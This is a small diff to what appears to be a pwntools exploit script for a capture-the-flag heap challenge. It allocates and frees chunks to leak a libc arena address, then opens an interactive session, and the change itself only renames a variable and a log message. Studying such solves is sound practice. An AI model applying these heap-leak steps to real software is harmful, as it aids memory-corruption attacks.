@@ -55,9 +55,8 @@ raise_flower(0x20)
 remove_flower(0)
 remove_flower(2)
 raise_flower(0x410, b'C'*8, b'D'*8)
-leak = int.from_bytes(visit_garden().split(b'\n')[4][-6:], 'little')
+arena_base = int.from_bytes(visit_garden().split(b'\n')[4][-6:], 'little')
 
-
-log.info("Leaked libc: %#lx" % leak)
+log.info("Arena base address: %#lx" % arena_base)
 p.interactive()
 
